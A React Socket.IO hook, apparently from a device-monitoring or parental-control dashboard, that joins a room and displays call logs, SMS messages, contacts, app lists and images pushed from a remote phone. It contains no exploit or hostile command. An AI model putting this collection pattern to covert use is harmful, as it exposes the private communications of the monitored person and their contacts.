import { useEffect,useState } from 'react';
import socket from './socket';
import {roomid} from '../components/LoginRegister';



function useSocket() {
  
  const [serverResponse, setserverResponse] = useState('');
  const [imageData, setimageData] = useState('');
  const [isSocketConnected, setIsconnected] = useState(false);
  
  useEffect(() => {
    socket.on('connect', () => {
      console.log('Connected to Socket.IO server');
        socket.emit('joinRoom', roomid);
        setIsconnected(true);
    });
    socket.on('disconnect', () => {
      setIsconnected(false);
      console.log('Disconnected from Socket.IO server');
    });

    socket.on('response', (message) => {
      try { 
      var msg = JSON.parse(message);
        var type = msg.type;
        var data = msg.data;
        switch (type) {
          case 'call_logs':
            setserverResponse('Received call logs: ' + data);
            break;
          case 'sms_log':
            setserverResponse('Received SMS logs:' + data);
            break;
          case 'contact_log':
            setserverResponse('Received contacts logs:'+ data);
            break;
            case 'app_logs':
              setserverResponse('Received app logs:' +  data);
            break;
            case 'image_data':
              setserverResponse('');
              var img = new Image();
              img.src = 'data:image/jpeg;base64,' + data;
              img.onload = () => {
              setimageData(data);
              
            }
            break;

            case 'list_blocked_packages':
              setserverResponse('Received blocked packages:' + data);
              break;

          default:
            setserverResponse('Unknown log type:'+ type);
            break;
        }
      }catch(e){
       if(e instanceof SyntaxError){
        setserverResponse('Received data:' + message);
      }
        console.log(e);
        }
      });
  } );
  return [serverResponse , imageData , isSocketConnected];
}
export default useSocket;
